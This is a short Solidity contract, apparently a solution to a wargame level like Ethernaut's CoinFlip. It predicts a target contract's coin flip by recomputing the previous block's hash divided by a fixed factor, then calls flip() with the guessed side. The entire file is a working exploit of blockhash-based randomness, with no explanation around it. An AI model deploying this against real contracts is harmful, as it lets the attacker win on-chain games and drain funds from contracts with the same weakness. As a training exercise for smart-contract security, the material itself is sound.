pragma solidity ^0.8.10;

import {console} from "forge-std/console.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    address private immutable target;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address target_) {
        target = target_;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinflip = blockValue / FACTOR;
        bool side = coinflip == 1 ? true : false;
        console.log("attacker coinflip: ", coinflip);
        bool success = ICoinFlip(target).flip(side);
    }
}
